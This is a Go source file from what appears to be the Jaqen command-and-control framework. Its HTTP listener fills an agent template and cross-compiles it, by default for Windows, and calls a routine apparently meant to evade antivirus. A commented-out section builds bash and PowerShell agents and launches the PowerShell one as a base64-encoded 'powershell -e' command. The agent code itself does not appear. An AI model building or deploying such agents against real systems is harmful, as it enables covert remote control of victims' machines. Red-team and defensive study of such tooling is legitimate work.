package httpListener

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"os"
	"path"
	"text/template"

	"github.com/c-sto/Jaqen/libJaqen/server"
	"github.com/gobuffalo/packr"
)

func (d JaqenhttpListener) genGolangAgent() []byte {
	//Thanks to moloch-- and the rosie project for figuring out how to do the generation stuff mostly good https://github.com/moloch--/rosie
	//host, _ := d.GetOption("ip")
	//port, _ := d.GetOption("port")
	checkinTime, _ := d.GetOption("checkintime")
	execTime, _ := d.GetOption("exectime")

	codeStruct := server.AgentCode{
		CmdExecTimeout: execTime,
		CheckinMaxTime: checkinTime,
		Imports:        `*//*`,
		GlobalVars: `
		*//*
`,
		Checkin:      `*//*`,
		Init:         `*//*`,
		GetCommand:   `*//*`,
		ExecCommand:  `*//*`,
		SendResponse: `*/*`,
	}

	codeStruct.AVoid("")

	boxs, err := packr.NewBox("../../../").MustString("agent/agent.go")
	if err != nil {
		fmt.Println(err)
		return []byte("")
	}

	code, err := template.New("goagent").Parse(boxs)
	if err != nil {
		fmt.Println(err)
		return []byte("")
	}

	var buf bytes.Buffer

	err = code.Execute(&buf, codeStruct)

	if err != nil {
		fmt.Println(err)
	}

	binDir, err := ioutil.TempDir("", "jaqen-build")

	if err != nil {
		fmt.Println(err)
	}

	workingDir := path.Join(binDir, "agent.go")

	fmt.Println("working", workingDir)
	codeFile, err := os.Create(workingDir)
	if err != nil {
		fmt.Println(err)
	}

	fmt.Println("Generating code to: " + codeFile.Name())

	err = code.Execute(codeFile, codeStruct)

	if err != nil {
		fmt.Println(err)
	}

	cgo, err := d.GetOption("cgo")
	if err != nil {
		cgo = "0"
	}
	goos, err := d.GetOption("goos")
	if err != nil {
		goos = "windows"
	}
	goarch, err := d.GetOption("goarch")
	if err != nil {
		goos = "x64"
	}

	outfile, _ := d.GetOption("outfile")

	buildr := []string{"build"}
	if outfile != "" {
		buildr = append(buildr, "-o")
		buildr = append(buildr, outfile)
	}

	goroot := server.GetGoRoot()
	gopath := server.GetGoPath()

	err = server.GoCmd(server.GoConfig{
		CGO:    cgo,
		GOOS:   goos,
		GOARCH: goarch,
		GOROOT: goroot,
		GOPATH: gopath,
	},
		binDir,
		buildr,
	)

	if err != nil {
		fmt.Println(err)
		return []byte{}
	}

	return []byte{} //buf.Bytes()
}

/*
type powershellagent struct {
	Domain string
	Split  int
}

func (d JaqenhttpListener) genBashAgent() string {
	dom, _ := d.GetOption("domain")

	spl := 60

	st, e := d.GetOption("split")
	if e == nil {
		spl, e = strconv.Atoi(st)
		if e != nil {
			fmt.Println(e)
		}
	}

	cfg := powershellagent{
		Domain: dom,
		Split:  spl,
	}
	boxs, err := packr.NewBox("./").MustString("bashhttpagent.sh")

	if err != nil {
		fmt.Println(err)
		return ""
	}
	code, err := template.New("bashhttpagent").Parse(boxs)
	if err != nil {
		fmt.Println(err)
		return ""
	}
	var buf bytes.Buffer

	err = code.Execute(&buf, cfg)
	if err != nil {
		fmt.Println(err)
	}
	return buf.String()
}

func (d JaqenhttpListener) genPowershellAgent() string {
	dom, _ := d.GetOption("domain")

	spl := 60

	st, e := d.GetOption("split")
	if e == nil {
		spl, e = strconv.Atoi(st)
		if e != nil {
			fmt.Println(e)
		}
	}

	cfg := powershellagent{
		Domain: dom,
		Split:  spl,
	}
	boxs, err := packr.NewBox("./").MustString("httpagent.ps1")

	if err != nil {
		fmt.Println(err)
		return ""
	}
	code, err := template.New("httpagent").Parse(boxs)
	if err != nil {
		fmt.Println(err)
		return ""
	}
	var buf bytes.Buffer

	err = code.Execute(&buf, cfg)
	if err != nil {
		fmt.Println(err)
	}
	x, _ := unicode.UTF16(unicode.LittleEndian, unicode.IgnoreBOM).NewEncoder().String(buf.String())
	return "powershell -e " + base64.StdEncoding.EncodeToString([]byte(x))
	//return x //buf.String()
}*/
